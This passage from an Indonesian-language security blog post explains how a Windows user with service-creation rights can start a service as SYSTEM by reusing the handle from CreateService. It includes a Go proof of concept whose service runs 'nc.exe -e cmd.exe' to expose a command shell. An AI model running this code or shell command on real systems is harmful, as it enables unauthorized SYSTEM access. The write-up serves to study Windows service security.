-<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat  service (level admin atau user dengan hak  <code>SC_MANAGER_CREATE_SERVICE</code>) bisa <strong>menentukan level akses dirinya terhadap service yang dibuat</strong> dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p>
-<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p>
-<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!</p>
-<p>Untuk mencoba hal tersebut tentunya kita perlu membuat custom program dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go">disini</a>).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
-
-<span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>
-
-<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="c1">// Creation of a Service: STEP 1
-</span><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
-</span><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-
-	<span class="c1">// define service
-</span><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
-	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>
-
-	<span class="c1">// Creation of a ervice: STEP 2
-</span><span class="c1"></span>	<span class="c1">// Create a service
-</span><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
-		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
-</span><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
-</span><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
-</span><span class="c1"></span>	<span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-
-	<span class="c1">// Creation of a Service: STEP 3
-</span><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
-</span><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-    <span class="c1">// Creation of a Service: STEP 4
-</span><span class="c1"></span>    <span class="c1">// Finally close the handles
-</span><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
-    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
-<span class="p">}</span>
-</code></pre></div><p>VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat <a href="https://github.com/VbScrub/ServiceInstallerTest">disini</a>.</p>
-<p><em>Hasilnya</em>?</p>
-<p>SYSTEM!*</p>
-<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
-</p>
-<blockquote>
-<p>*Perlu diingat user yang menjalankan program sudah perlu hak akses <code>SC_MANAGER_CREATE_SERVICE</code>.</p>
-</blockquote>
-<p><em>Tapi, kenapa harus custom code?</em></p>
-<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
-DESCRIPTION:
-        Creates a service entry in the registry and Service Database.
-USAGE:
-        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...
-
-OPTIONS:
-NOTE: The option name includes the equal sign.
-      A space is required between the equal sign and the value.
- <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
- <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
- <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
- <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
- <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
- <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
- <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
- <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
- <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
- <span class="nv">password</span><span class="o">=</span> &lt;password&gt;
-</code></pre></div><h2 id="conclusion">Conclusion</h2>
-<p>Disini kita tahu bahwa regular user dengan hak pembuatan service (<code>SC_MANAGER_CREATE_SERVICE</code>)  dapat membuat sebuah service tapi tidak memiliki kontrol langsung untuk menjalankan service tersebut. Namun, beda ceritanya jika handle yang didapatkan dari pembuatan sebuah service langsung digunakan untuk melakukan kontrol terhadap service yang dibuat.</p>
-<p>Saya sendiri setuju dengan VbScrub bahwa ini kemungkinan bukan security issue. Karena kalau kita mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?">dokumentasi Microsoft</a>, bisa disimpulkan secara tidak langsung jika user yang mampu membuat service adalah termasuk admin.</p>
-<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
-</p>
-<p>Untuk eksploitasi hak <code>SC_MANAGER_CREATE_SERVICE</code> tanpa custom compiled program kita bisa mengubah nilai &ldquo;start up type&rdquo; si service ke otomatis ketika booting dengan mensuplai <code>start=auto</code> di <code>sc.exe</code>.</p>
-<p>Sekian~</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>*Ngulik itu sebangsa ngoprek 😅&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-]]></content:encoded>
     </item>
     
   </channel>
